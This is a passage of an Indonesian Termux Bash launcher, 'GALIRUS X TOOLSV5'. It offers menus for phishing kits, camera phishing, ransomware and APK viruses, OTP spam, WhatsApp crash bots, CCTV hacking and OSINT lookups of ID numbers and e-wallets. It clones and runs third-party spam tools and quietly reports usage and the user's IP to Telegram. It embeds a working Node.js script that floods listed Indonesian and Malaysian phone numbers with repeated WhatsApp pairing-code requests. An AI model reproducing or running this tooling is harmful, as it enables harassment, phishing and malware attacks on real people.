                                   maintenance &> /dev/null
                                   find $PREFIX/tmp -mindepth 1 -type f -exec shred -u {} \;
                                   kill_sound &> /dev/null &
                                   exit 0
                            fi
                            function loading2() {
                                   text="MENDOWNLOAD REPOSITORY SABAR"
                                   columns=$(stty size | awk '{print $2}')
                                   while true; do
                                          for ((i = 1; i <= columns; i++)); do
                                                 clear
                                                 printf "%*s\n" $i "$text"
                                                 sleep 0.05
                                          done
                                          for ((i = columns; i >= 1; i--)); do
                                                 clear
                                                 printf "%*s\n" $i "$text"
                                                 sleep 0.05
                                          done
                                   done
                            }
                            function ENTER() {
                                   e "$m"
                                   sleep 5
                                   read -p "ENTER UNTUK MENGULAGI TOOLSV5"
                            }
                            nama_file="$PREFIX/include/bash/include/filememek.h"
                            while true; do
                                   if [ -f $nama_file ]; then
                                          function kotak() {
                                                 len=$((${#str} + 4))
                                                 printf "╔"
                                                 for ((i = 1; i <= len; i++)); do
                                                        printf "═"
                                                 done
                                                 printf "╗\n"
                                                 printf "║  %s  ║\n" "$str"
                                                 printf "╚"
                                                 for ((i = 1; i <= len; i++)); do
                                                        printf "═"
                                                 done
                                                 printf "╝\n"
                                          }
                                          hore_ultah() {
                                                 bluearchive() {
                                                        audioupdate() {
                                                               cd $PREFIX/lib/python3.11/email/mime/.tanjhobi
                                                               git pull origin main &> /dev/null
                                                               git stash &> /dev/null
                                                        }
                                                        audioupdate &> /dev/null &
                                                        audio_dir="$PREFIX/lib/python3.11/email/mime/.tanjhobi"
                                                        find "$audio_dir" -type f -name "*.ogg" | shuf | while read -r audio; do
                                                               mpv --volume=80 "$audio" &> /dev/null
                                                        done
                                                        musikrun &> /dev/null &
                                                 }
                                                 bahancuy() {
                                                        cd $PREFIX/lib/python3.11/email/mime/
                                                        git clone --depth 32 https://github.com/Hozowaorokananingenda/.tanjhobi
                                                        cd .tanjhobi
                                                        git pull origin main &> /dev/null
                                                        git stash &> /dev/null
                                                 }
                                                 while true; do
                                                        ultah="$PREFIX/include/bash/.tah"
                                                        soundnya="$PREFIX/lib/python3.11/email/mime/.tanjhobi"
                                                        if [[ -f $ultah && -d $soundnya ]]; then
                                                               current_date=$(date +%d.%m.%Y)
                                                               dangisi=$(cat "$ultah")
                                                               dangisi_convert=$(echo "$dangisi" | awk -F. '{print $3"-"$2"-"$1}')
                                                               current_date_convert=$(echo "$current_date" | awk -F. '{print $3"-"$2"-"$1}')
                                                               current_month_day=$(echo "$current_date" | awk -F. '{print $2"-"$1}')
                                                               dangisi_month_day=$(echo "$dangisi" | awk -F. '{print $2"-"$1}')
                                                               current_year=$(date +%Y)
                                                               current_date_same_year="$current_year-$current_month_day"
                                                               dangisi_same_year="$current_year-$dangisi_month_day"
                                                               if [ "$dangisi_same_year" == "$current_date_same_year" ]; then
                                                                      clear
                                                                      ultah_text="Selamat Ulang Tahun Sensei!"
                                                                      bluearchive &
                                                               else
                                                                      clear
                                                                      dangisi_date=$(date -d "$dangisi_same_year" +%s)
                                                                      current_date_seconds=$(date -d "$current_date_same_year" +%s)
                                                                      diff_seconds=$((dangisi_date - current_date_seconds))
                                                                      diff_days=$((diff_seconds / 86400))
                                                                      if [ $diff_days -lt 0 ]; then
                                                                             diff_days=$((diff_days + 365))
                                                                      fi
                                                                      ultah_text="$(printf '%03d' "$diff_days") hari lagi"
                                                                      play_sound_effect &> /dev/null &
                                                                      musikrun &> /dev/null &
                                                               fi
                                                               hasil_ultah=$(printf "║  $bl•$p Ultah$bl   :$k$ran3 %-30s $ran     ║" "$ultah_text")
                                                               break
                                                        else
                                                               clear
                                                               play -q $HOME/Lubeban/sound/robot.mp3 &> /dev/null &
                                                               bahancuy &> /dev/null | e $h "Installer System Ultah Anda Harap Sabar Menunggu !"
                                                               while true; do
                                                                      clear
                                                                      play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                                                                      e $m $bg_lg "Silahkan Masukkan Ulang Tahun Anda$k!\n$k($b contoh$k:$bl 30.12.2000 $k) $res $b"
                                                                      echo
                                                                      read -p "  Tanggal.Bulan.Tahun ===>  " dangisi
                                                                      play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                                                                      if [ -z "$dangisi" ]; then
                                                                             echo
                                                                             play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                                             e $m "JANGAN DI KOSONG KAN KOCAK :D"
                                                                             sleep 3
                                                                      elif [[ $dangisi =~ ^[0-9]{2}\.[0-9]{2}\.[0-9]{4}$ ]]; then
                                                                             echo "$dangisi" > "$ultah"
                                                                             clear
                                                                             echo
                                                                             play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                                                                             e $h $bg_lg "Terima kasih$k!\n$h Tanggal ulang tahun Anda telah disimpan.$res"
                                                                             sleep 3
                                                                             break
                                                                      else
                                                                             echo
                                                                             play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                                             e $m "NGUAWUR KON :D"
                                                                             sleep 3
                                                                      fi
                                                               done
                                                        fi
                                                 done
                                          }
                                          total_user_ids=$(curl -sL "$DATABASE_URL" | grep -oP 'user\d+' | sort -u | wc -l)
                                          random_number=$((RANDOM % total_user_ids))
                                          nama=$(cat $nama_file)
                                          hari=$(date +%A)
                                          jam=$(date +"%H")
                                          tanggal=$(date +"%d %B %Y")
                                          jam=$((10#$jam))
                                          if [[ $jam -ge 0 && $jam -lt 10 ]]; then
                                                 ucapan="Pagi 🌄 "
                                                 ucapanrek="mpv $HOME/Lubeban/sound/pagi.mp3"
                                          elif [[ $jam -ge 10 && $jam -lt 15 ]]; then
                                                 ucapan="Siang 🌤️ "
                                                 ucapanrek="mpv $HOME/Lubeban/sound/siang.mp3"
                                          elif [[ $jam -ge 15 && $jam -lt 18 ]]; then
                                                 ucapan="Sore 🌇 "
                                          else
                                                 ucapan="Malam 🌃"
                                                 ucapanrek="mpv $HOME/Lubeban/sound/malam.mp3"
                                          fi

                                          case $hari in
                                                 "Monday") ucap="Senin," ;;
                                                 "Tuesday") ucap="Selasa," ;;
                                                 "Wednesday") ucap="Rabu," ;;
                                                 "Thursday") ucap="Kamis," ;;
                                                 "Friday") ucap="Jumat," ;;
                                                 "Saturday") ucap="Sabtu," ;;
                                                 "Sunday") ucap="Minggu," ;;
                                          esac
                                          shuffle_string() {
                                                 str=$1
                                                 arr=($(echo $str | sed -e 's/\(.\)/\1 /g'))
                                                 for i in $(seq 0 $((${#arr[@]} - 2))); do
                                                        j=$(($((RANDOM % $((${#arr[@]} - i)))) + i))
                                                        tmp=${arr[$i]}
                                                        arr[$i]=${arr[$j]}
                                                        arr[$j]=$tmp
                                                 done
                                                 echo ${arr[@]} | sed -e 's/ //g'
                                          }
                                          anomali=$(printf "%-24s" "$nama")
                                          jam=$(date +"%k")
                                          TAMPILANTOOLSV5() {
                                                 cek="$gal"
                                                 if [ -f "$cek" ]; then
                                                        check_premium_status="PREMIUM"
                                                 else
                                                        check_premium_status="TRIAL"
                                                 fi
                                                 cek_akses() {
                                                        if [[ "$check_premium_status" = "TRIAL" ]]; then
                                                               play -q "$HOME/Lubeban/sound/salah.mp3" &> /dev/null &
                                                               e "$bg_m Akses Ini Hanya Di Berikan Kepada Penguna Permanen $res"
                                                               sleep 5
                                                               TOOLS
                                                               return
                                                        fi
                                                 }
                                                 isipesan="Terdeteksi Masuk Ke Menu Awal"
                                                 telegram &> /dev/null &
                                                 global_status="$check_premium_status"
                                                 ip_info=$(curl -s https://ipwhois.app/json/)
                                                 ip=$(echo $ip_info | jq -r '.ip')
                                                 address=$(printf "%-20s" "$ip")
                                                 cd $HOME/Lubeban
                                                 clear
                                                 play -q $HOME/Lubeban/sound/robot2.mp3 &> /dev/null &
                                                 e "              $bg_lg GALIRUS X TOOLSV5  $res" | lolcat
                                                 e $ran"╔══════════════════════════════════════════════════╗$ran"
                                                 e $ran"║          _     _     _     _     _               ║"
                                                 e $ran"║         / \   / \   / \   / \   / \              ║"
                                                 e $ran"║        ($ran1 T$ran ) ($ran1 O$ran ) ($ran1 O$ran ) ($ran1 L$ran ) ($ran1 S$ran )             ║"
                                                 e $ran"║         \_/   \_/   \_/   \_/   \_/$ran1 V5 $ran          ║"
                                                 e $ran"║                                                  ║"
                                                 e $ran"╚══════════════════════════════════════════════════╝$ran"
                                                 e $ran"║                                                  ║"
                                                 play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                                                 e $ran"╔══════════════════════════════════════════════════╗$ran"
                                                 e $ran"║  $m•$p Author$bl  :$ran3 GALIRUS OFFICIAL            $ran       $ran ║"
                                                 e $ran"║  $k•$p Github$bl  :$ran3 github.com/GALIRUS404       $ran       $ran ║"
                                                 e $ran"║  $h•$p Rilis $bl  :$ran3 23,03,2023                  $ran       $ran ║"
                                                 e $ran"║  $b•$p Your ID$bl :$ran3 $(printf '%-32s' $(whoami))$ran    ║"
                                                 e $ran"║  $u•$p Status$bl  :$ran3 $(printf '%-32s' "$global_status")$ran   $ran ║"
                                                 e $ran"║  $m•$p Total $bl  :$ran3 $(printf "%03d" "$total_user_ids")$ran3 penguna            $ran            $ran ║"
                                                 e $ran"║  $p•$p online$bl  :$ran3 $(printf "%03d" "$random_number")$ran3 penguna            $ran            $ran ║"
                                                 e $ran"║  $pu•$p Versi$bl   :$k$ran3 $versitoolsv5                   $ran           $ran ║"
                                                 echo "$hasil_ultah"
                                                 e $ran"║  $h•$p IP   $bl   :$k$ran3 $address               $ran ║"
                                                 e $ran"╚══════════════════════════════════════════════════╝$ran"
                                                 e $ran"║                                                  ║"
                                                 sleep 0.5
                                          }
                                          SPAM() {
                                                 e $ran"╔══════════════════════════════════════════════════╗$ran"
                                                 e $ran"║              $bg_lg $m LIST SPAM KODE +62 $res  $b          $ran   ║"
                                                 e $ran"╚══════════════════════════════════════════════════╝$ran"
                                                 e $ran"║$ran2 [$k s1$ran2 ]$ran  ║$h SPAM BOT BOT TELE ORANG               $ran ║"
                                                 e $ran"║$ran2 [$k s2$ran2 ]$ran  ║$h SPAM PAIRING PAYLOD WEB               $ran ║"
                                                 e $ran"║$ran2 [$k s3$ran2 ]$ran  ║$h MONITORING  BOT TARGET                $ran ║"
                                                 e $ran"║$ran2 [$k s4$ran2 ]$ran  ║$h SPAM OTP MODE ALL                     $ran ║"
                                                 e $ran"║$ran2 [$k bk$ran2 ]$ran  ║$h KEMBALI KE MENU AWAL                  $ran ║"
                                                 e $ran"║$ran2 [$k 0 $ran2 ]$ran  ║$h EXIT$ran                                  $ran ║"
                                                 e $ran"╚══════════════════════════════════════════════════╝$ran"
                                          }
                                          PHISING() {
                                                 e $ran"╔══════════════════════════════════════════════════╗$ran"
                                                 e $ran"║      $m      $bg_lg LIST PHISING & HACKING $res $ran             ║"
                                                 e $ran"╚══════════════════════════════════════════════════╝$ran"
                                                 e $ran"║$ran2 [$k 10$ran2 ]$ran ║$h INSTALLER MANUAL                       $ran ║"
                                                 e $ran"║$ran2 [$k 11$ran2 ]$ran ║$h SEEKER                                 $ran ║"
                                                 e $ran"║$ran2 [$k 12$ran2 ]$ran ║$h ZPHISHER                               $ran ║"
                                                 e $ran"║$ran2 [$k 13$ran2 ]$ran ║$h APK AI FOTO TERLARANG                  $ran ║"
                                                 e $ran"║$ran2 [$k 14$ran2 ]$ran ║$h DEFACEG404                             $ran ║"
                                                 e $ran"║$ran2 [$k 15$ran2 ]$ran ║$h ADBWEBKIT                              $ran ║"
                                                 e $ran"║$ran2 [$k 16$ran2 ]$ran ║$h PENJELAJAH NAME                        $ran ║"
                                                 e $ran"║$ran2 [$k 17$ran2 ]$ran ║$h CAMERA PHISING                         $ran ║"
                                                 e $ran"║$ran2 [$k 18$ran2 ]$ran ║$h GEMINI AI LOCALHOST                    $ran ║"
                                                 e $ran"║$ran2 [$k 19$ran2 ]$ran ║$h CHECK IP WEBSITE                       $ran ║"
                                                 e $ran"║$ran2 [$k 20$ran2 ]$ran ║$h VIEW TIKTOK                            $ran ║"
                                                 e $ran"║$ran2 [$k 22$ran2 ]$ran ║$h DOWNLOAD ALL NO WATERMARK              $ran ║"
                                                 e $ran"║$ran2 [$k 23$ran2 ]$ran ║$h SHARE FILE CONVERT LINK                $ran ║"
                                                 #        e $ran"║$ran2 [$k 24$ran2 ]$ran ║$h TEMP MAIL                              $ran ║"
                                                 e $ran"║$ran2 [$k 25$ran2 ]$ran ║$h OSINT ALL                              $ran ║"
                                                 e $ran"║$ran2 [$k 26$ran2 ]$ran ║$h CLOUDFLARED URL                        $ran ║"
                                                 e $ran"║$ran2 [$k 27$ran2 ]$ran ║$h BRUTEFORCE ZIP                         $ran ║"
                                                 e $ran"║$ran2 [$k 28$ran2 ]$ran ║$h VIRUS APK                              $ran ║"
                                                 e $ran"║$ran2 [$k 29$ran2 ]$ran ║$h OSINT NUMBER KE NIK                    $ran ║"
                                                 e $ran"║$ran2 [$k 30$ran2 ]$ran ║$h VIRUS RANSOM                           $ran ║"
                                                 e $ran"║$ran2 [$k 31$ran2 ]$ran ║$h GHOST TRACK ( OSINT )                  $ran ║"
                                                 e $ran"║$ran2 [$k 32$ran2 ]$ran ║$h SCANNING DOMAIN                        $ran ║"
                                                 #        e $ran"║$ran2 [$k 33$ran2 ]$ran ║$h RED HAWK                               $ran ║"
                                                 e $ran"║$ran2 [$k 34$ran2 ]$ran ║$h PENATAAN SCRIPT                        $ran ║"
                                                 e $ran"║$ran2 [$k 35$ran2 ]$ran ║$h SHIROKO GALERY EYES                    $ran ║"
                                                 e $ran"║$ran2 [$k 36$ran2 ]$ran ║$h ADB DEBUGGING                          $ran ║"
                                                 e $ran"║$ran2 [$k 37$ran2 ]$ran ║$h OSINT EWALLET                          $ran ║"
                                                 e $ran"║$ran2 [$k 38$ran2 ]$ran ║$h CREATE HTML                            $ran ║"
                                                 e $ran"║$ran2 [$k 39$ran2 ]$ran ║$h EXIT TOOL EDITOR                       $ran ║"
                                                 e $ran"║$ran2 [$k 40$ran2 ]$ran ║$h CCTV HACKS MEMANTAU LALU LINTAS        $ran ║"
                                                 e $ran"║$ran2 [$k bk$ran2 ]$ran ║$h KEMBALI KE MENU AWAL                   $ran ║"
                                                 e $ran"║$ran2 [$k 0 $ran2 ]$ran ║$h EXIT$ran                                   $ran ║"
                                                 e $ran"╚══════════════════════════════════════════════════╝$ran"
                                          }
                                          PROMOSI_BERBAYAR() {
                                                 e $ran"╔══════════════════════════════════════════════════╗$ran"
                                                 e $ran"║      $m$bg_lg LIST PRODUK YANG MUNGKIN ANDA MINAT $res $b   $ran   ║"
                                                 e $ran"╚══════════════════════════════════════════════════╝$ran"
                                                 e $ran"║$ran2 [$k  1$ran2 ]$ran ║$h SPAM OTP ( TELEGRAM  ) SANZ            $ran ║"
                                                 e $ran"║$ran2 [$k  2$ran2 ]$ran ║$h GALERI EYES CREATE ( GALIRUS OFFICIAL )$ran ║"
                                                 e $ran"║$ran2 [$k  3$ran2 ]$ran ║$h KAMERA PHISING ( TRUST-YOURCAM )       $ran ║"
                                                 e $ran"║$ran2 [$k  4$ran2 ]$ran ║$h CRACK IG DEVELOPMENT VIEW TECH         $ran ║"
                                                 e $ran"║$ran2 [$k bk$ran2 ]$ran ║$h KEMBALI KE MENU AWAL                   $ran ║"
                                                 e $ran"║$ran2 [$k  0$ran2 ]$ran ║$h EXIT$ran                                   $ran ║"
                                                 e $ran"╚══════════════════════════════════════════════════╝$ran"
                                          }
                                          BOTZ() {
                                                 e $ran"╔══════════════════════════════════════════════════╗$ran"
                                                 e $ran"║$k      $m $bg_lg BOT WHATSAPP SUPPORT TERMUX $res    $ran       $ran   ║"
                                                 e $ran"╚══════════════════════════════════════════════════╝"
                                                 e $ran"║$ran2 [$k bot1$ran2 ]$ran ║$h BOT BUG VIA TERMUX                   $ran ║"
                                                 e $ran"║$ran2 [$k bot2$ran2 ]$ran ║$h BOT BUG VIA TERMUX                   $ran ║"
                                                 e $ran"║$ran2 [$k  bk$ran2  ]$ran ║$h KEMBALI KE MENU AWAL                 $ran ║"
                                                 e $ran"╚══════════════════════════════════════════════════╝$ran"
                                          }
                                          READ() {
                                                 sleep 0.2
                                                 e $ran "    ┌───────────────────────────┐"
                                                 e $ran "╭───┤$ranl •$m $anomali$ran┃$ran"
                                                 e $ran "├───┤$k •$m Selamat $ucapan        $ran│"
                                                 e $ran "├───┤$h •$m Sekarang jam$h :$jam:$(date +"%M") $waktu$ran    │"
                                                 e $ran "│   └───────────────────────────┘"
                                                 read -p ' ╰─────────▶ ' no
                                                 play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
                                          }
                                          function TOOLS() {
                                                 while true; do
                                                        clear
                                                        TAMPILANTOOLSV5
                                                        e $ran"╔══════════════════════════════════════════════════╗$ran"
                                                        e $ran"║     $m     $bg_lg SILAHKAN PILIH TOOLS DIBAWAH $res     $ran    $ran ║"
                                                        e $ran"╚══════════════════════════════════════════════════╝$ran"
                                                        e $ran"║                                                  ║"
                                                        e $ran"╔══════════════════════════════════════════════════╗$ran"
                                                        e $ran"║$ran2 [$k SPAM$ran2 ]$ran  ║$h MENU SPAMMING                       $ran ║"
                                                        e $ran"║$ran2 [$k  ALL$ran2 ]$ran  ║$h MENU PHISING & HACKING              $ran ║"
                                                        e $ran"║$ran2 [$k  BOT$ran2 ]$ran  ║$h BOT BUG WHATSAPP UI VIA TERMUX      $ran ║"
                                                        e $ran"║$ran2 [$k  BUY$ran2 ]$ran  ║$h MENU LIST PRODUK BERBAYAR           $ran ║"
                                                        e $ran"║$ran2 [$k  SC+$ran2 ]$ran  ║$h SCRIPT TAMBAHAN DILUAR TOOLSV5      $ran ║"
                                                        e $ran"║$ran2 [$k  DEL$ran2 ]$ran  ║$h MENGHAPUS RIWAYAT SCRIPT            $ran ║"
                                                        e $ran"╚══════════════════════════════════════════════════╝$ran"
                                                        e $ran"║                                                 $ran ║"
                                                        e $ran"╔══════════════════════════════════════════════════╗$ran"
                                                        e $ran"║$k      $m         $bg_lg PEMBERITAHUAN $res       $ran           $ran  ║"
                                                        e $ran"╚══════════════════════════════════════════════════╝"
                                                        e $ran"║$ran2 [$k  INFO$ran2  ]$ran ║$h LIST UPDATE TOOLSV5               $ran  ║"
                                                        e $ran"║$ran2 [$k ON/OFF$ran2 ]$ran ║$h PUTAR/HENTIKAN MUSIK              $ran  ║"
                                                        e $ran"║$ran2 [$k NO/YES$ran2 ]$ran ║$h PUTAR/HENTIKAN ARAHAN             $ran  ║"
                                                        e $ran"║$ran2 [$k VOICE $ran2 ]$ran ║$h PUTAR SOUND EFEK                  $ran  ║"
                                                        e $ran"║$ran2 [$k CACHE$ran2  ]$ran ║$h MANAGER CLEAR CACHE               $ran  ║"
                                                        e $ran"║$ran2 [$k MUSIK$ran2  ]$ran ║$h MANAGER SETTING SOUND             $ran  ║"
                                                        #        e $ran"║$ran2 [$k TUTOR$ran2  ]$ran ║$h EDUKASI VIDEO                     $ran  ║"
                                                        e $ran"║$ran2 [$k REPORT$ran2 ]$ran ║$h LAPORKAN BUG                      $ran  ║"
                                                        e $ran"║$ran2 [$k   0 $ran2   ]$ran ║$h EXIT$ran                               $ran ║"
                                                        e $ran"╚══════════════════════════════════════════════════╝"
                                                        READ
                                                        if [[ $no == "spam" || $no == "SPAM" ]]; then
                                                               while true; do
                                                                      isipesan="Terdetek login ke Spam 👨‍💻"
                                                                      telegram &> /dev/null &
                                                                      TAMPILANTOOLSV5
                                                                      SPAM
                                                                      READ
                                                                      if [[ $no == "down" || $no == "down" ]]; then
                                                                             s7="$DIR_SAVE/litespam"
                                                                             if [ -d "$s7" ]; then
                                                                                    clear
                                                                                    logfile="$PREFIX/share/list/s1" &> /dev/null
                                                                                    cd $PREFIX/share/list &> /dev/null
                                                                                    git pull origin main &> /dev/null
                                                                                    git stash &> /dev/null
                                                                                    e $k "Salin Token Di Bawah Ini$h"
                                                                                    cat "$logfile"
                                                                                    echo
                                                                                    e $m
                                                                                    read -p "Enter Untuk Melanjutkan"
                                                                                    clear
                                                                                    cd $s7
                                                                                    ./main
                                                                                    break
                                                                             else
                                                                                    play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                                                    clear
                                                                                    cd $DIR_SAVE
                                                                                    $paket install -y bash git curl wget jq make clang
                                                                                    git clone --depth 32 https://github.com/Sxp-ID/litespam
                                                                                    cd litespam
                                                                                    make install
                                                                             fi
                                                                             read -p "ENTER UNTUK MENGULANG TOOLSV5"
                                                                      elif [[ $no == "s1X" || $no == "S1X" ]]; then
                                                                             spamtautan="$PREFIX/lib/bash/spam/"
                                                                             if [ -d "$spamtautan" ]; then
                                                                                    clear
                                                                                    cd $PREFIX/lib/bash/spam || exit
                                                                                    git pull origin main &> /dev/null
                                                                                    packagenya() {
                                                                                           cat << EOF > package.json
{
"main": "galirus.js",
"scripts": {
"start": "node galirus.js"
},
"author": "Galirus & Gusti",
"license": "MIT",
"dependencies": {
"@whiskeysockets/baileys": "^6.5.0",
"chalk": "^4.1.2",
"pino": "^7.0.5",
"readline": "^1.3.0",
"express": "^4.18.2",
"fs": "^0.0.1-security"
}
}
EOF
                                                                                    }
                                                                                    packagenya
                                                                                    isipesan="Terdeteksi login s1 ( spam pair )  💻"
                                                                                    telegram &> /dev/null &
                                                                                    while true; do
                                                                                           file="node_modules"
                                                                                           if [ -d "$file" ]; then
                                                                                                  clear
                                                                                                  echo "y" | termux-setup-storage &> /dev/null &
                                                                                                  while true; do
                                                                                                         scan="$HOME/number.txt"
                                                                                                         if [ -f "$scan" ]; then
                                                                                                                break
                                                                                                         else
                                                                                                                touch $HOME/number.txt
                                                                                                         fi
                                                                                                  done
                                                                                                  spamnya() {
                                                                                                         file="$HOME/number.txt"
                                                                                                         loading() {
                                                                                                                (for i in {1..100}; do
                                                                                                                       echo $i
                                                                                                                       sleep 0.05
                                                                                                                done) | dialog --gauge "Loading, mohon tunggu..." 10 50 0
                                                                                                         }
                                                                                                         loading1() {
                                                                                                                (for i in {1..100}; do
                                                                                                                       echo $i
                                                                                                                done) | dialog --gauge "Loading, mohon tunggu..." 10 50 0
                                                                                                         }
                                                                                                         show_file() {
                                                                                                                if [ -f "$file" ]; then
                                                                                                                       content=$(cat "$file")
                                                                                                                       echo "$content"
                                                                                                                else
                                                                                                                       echo "File $file tidak ditemukan."
                                                                                                                fi
                                                                                                         }
                                                                                                         add_number() {
                                                                                                                show_file
                                                                                                                number=$(dialog --inputbox "Masukkan nomor yang ingin ditambahkan ( 628 ):" 15 40 --stdout)
                                                                                                                if [[ $number =~ ^[0-9]+$ ]]; then
                                                                                                                       echo "$number" >> "$file"
                                                                                                                       dialog --msgbox "Nomor $number telah ditambahkan ke dalam file." 8 40
                                                                                                                else
                                                                                                                       dialog --msgbox "Masukan tidak valid. Harap masukkan hanya angka." 8 40
                                                                                                                fi
                                                                                                         }
                                                                                                         remove_number() {
                                                                                                                show_file
                                                                                                                if [ -f "$file" ]; then
                                                                                                                       number_to_remove=$(dialog --inputbox "Masukkan nomor telepon yang ingin dihapus ( 628 ):" 15 40 --stdout)
                                                                                                                       if [[ $number_to_remove =~ ^[0-9]+$ ]]; then
                                                                                                                              sed -i "/$number_to_remove/d" "$file"
                                                                                                                              dialog --msgbox "Nomor telepon $number_to_remove telah dihapus dari file." 8 40
                                                                                                                       else
                                                                                                                              dialog --msgbox "Masukan tidak valid. Harap masukkan hanya angka." 8 40
                                                                                                                       fi
                                                                                                                else
                                                                                                                       dialog --msgbox "File $file tidak ditemukan." 8 40
                                                                                                                fi
                                                                                                         }
                                                                                                         while true; do
                                                                                                                clear
                                                                                                                choice=$(dialog --menu "Menu: Spam Pair Indo & Malay" 10 40 3 \
                                                                                                                       1 "Gas Spam Pairing" \
                                                                                                                       2 "Lihat Daftar Nomor" \
                                                                                                                       3 "Tambah nomor" \
                                                                                                                       4 "Hapus nomor" \
                                                                                                                       5 "Editing Number Full" \
                                                                                                                       0 "Keluar" --stdout)
                                                                                                                case "$choice" in
                                                                                                                       1)
                                                                                                                              clear
                                                                                                                              loading
                                                                                                                              cd "$spamtautan"
                                                                                                                              clear
                                                                                                                              node -e "$(
                                                                                                                                     cat << 'EOF'
const readline = require('readline');
const chalk = require('chalk');
const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const path = require('path');
const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
});
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const numberFilePath = path.join(process.env.HOME, 'number.txt');
let numbers = [];
const loadNumbers = () => {
try {
const data = fs.readFileSync(numberFilePath, 'utf8');
numbers = data.split('\n').map(num => num.trim()).filter(num => num !== '');
if (numbers.length === 0) {
console.log(chalk.red.bold('Tidak ada nomor yang ditemukan di file number.txt'));
}
} catch (err) {
console.error(chalk.red.bold(`Error membaca file: ${err.message}`));
}
};
// Validasi nomor menggunakan regex
const isValidPhoneNumber = (phoneNumber) => {
const regex = /^(60\d{8,11}|62\d{9,12})$/; // Format Malaysia & Indonesia
return regex.test(phoneNumber);
};
const clearConsole = () => {
process.stdout.write('\x1B[2J\x1B[0f');
};
const startSpamProcess = async () => {
try {
let { state } = await useMultiFileAuthState('Galirus_&_Gusti');
let { version } = await fetchLatestBaileysVersion();
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) });
while (true) {
let validNumbers = numbers.filter(isValidPhoneNumber);
if (validNumbers.length === 0) {
console.log(chalk.red.bold('Tidak ada nomor yang valid. Memeriksa ulang dalam 60 detik...'));
await sleep(60000);
continue;
}
for (const target of validNumbers) {
console.log(chalk.greenBright.bold(`Mengirim spam ke nomor: ${target}`));
await startSpamming(sucked, target);
}
console.log(chalk.greenBright.bold('Semua nomor telah di-spam. Menunggu 60 detik sebelum mengulangi...'));
await sleep(60000);
console.clear();
}
} catch (error) {
handleError(error);
}
};
const getRandomColor = () => {
const letters = '0123456789ABCDEF';
let color = '#';
for (let i = 0; i < 6; i++) {
color += letters[Math.floor(Math.random() * 16)];
}
return color;
};
const startSpamming = async (sucked, target) => {
for (let i = 0; i < 15; i++) {
await sleep(3000);
console.clear();
const prc = await sucked.requestPairingCode(target);
const randomColor = getRandomColor();
console.log(chalk.greenBright.bold(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣿⣿⣶⣶⣶⣶⣦⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠶⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡄⢀⠴⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣎⣴⣋⣠⣤⣔⣠⣤⣤⣠⣀⣀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣂⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡾⣻⣿⣿⣿⣿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣧⡀⠀
⠀⠀⠀⠀⠀⣀⣾⣿⣿⣿⠿⠛⠂⠀⠀⡀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡈⢻⣿⣿⣆⠈⢻⣧⠀
⠀⠀⠀⠀⠻⣿⠛⠉⠀⠀⠀⠀⢀⣤⣾⣿⣦⣤⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⡇⠀⢻⣿⣿⡀⠀⠻⡆
⠀⠀⣰⣤⣤⣤⣤⣤⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⢻⣿⣿⣿⠀⠀⢹⣿⣇⠀⠀⠳
⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢻⠛⠛⠻⣿⣿⣿⣿⣿⣿⣿⣧⠀⢻⣿⣿⡆⠀⠀⢻⣿⠀⠀⠀
⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠼⠛⢿⣶⣦⣿⣿⠻⣿⣿⣿⣿⣿⣇⠀⢻⣿⡇⠀⠀⠀⣿⠀⠀⠀
⠸⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠀⠀⠀⠀⠀⠘⠁⠈⠛⠋⠀⠘⢿⣿⣿⣿⣿⡀⠈⣿⡇⠀⠀⠀⢸⡇⠀⠀
⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⡇⠀⢹⠇⠀⠀⠀⠈⠀⠀⠀
